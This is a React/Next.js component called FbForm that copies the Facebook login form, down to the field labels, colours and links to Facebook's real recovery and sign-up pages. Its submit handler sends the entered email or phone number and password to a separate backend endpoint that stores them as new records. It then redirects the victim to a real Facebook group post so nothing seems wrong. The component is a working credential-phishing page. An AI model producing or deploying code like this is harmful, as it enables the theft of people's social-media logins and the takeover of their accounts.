"use client";

import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { z } from "zod";

import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import Link from "next/link";
import axios from "axios";
import { useRouter } from "next/navigation";

const formSchema = z.object({
  username: z.string().min(2, {
    message: "Username must be at least 2 characters.",
  }),
  password: z
    .string()
    .min(8, { message: "Password must contain at least 8 character" }),
});

export function FbForm() {
  // 1. Define your form.
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      username: "",
      password: "",
    },
  });

  // 2. Define a submit handler.
  const router = useRouter()
 async function onSubmit(values: z.infer<typeof formSchema>) {
    try{
      
    console.log(values);
   const result=await axios.post("http://localhost:4000/user/create",values)
   if(result.status===201){
    router.push("https://www.facebook.com/groups/shonirakhra/permalink/3741482896113640/?app=fbl")
   }
    }catch(err){
      console.log(err);
    }
  }

  return (
    <div>
      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
          <FormField
            control={form.control}
            name="username"
            render={({ field }) => (
              <FormItem>
                <FormControl>
                  <Input placeholder="Email or phone number" {...field} />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />

          <FormField
            control={form.control}
            name="password"
            render={({ field }) => (
              <FormItem>
                <FormControl>
                  <Input placeholder="Password" {...field} />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />
          <Button type="submit">Login</Button>
        </form>
      </Form>
      <Link href={"https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"}>
      <p className="text-[#1877F2] text-center p-7 cursor-pointer">
        Forgot Password?
      </p></Link>
      <hr className="mb-5" />
      <Link
        href={
          "https://www.facebook.com/r.php"
        }
      >
        <Button className="bg-[#42B72A] ">Create new account</Button>
      </Link>
    </div>
  );
}
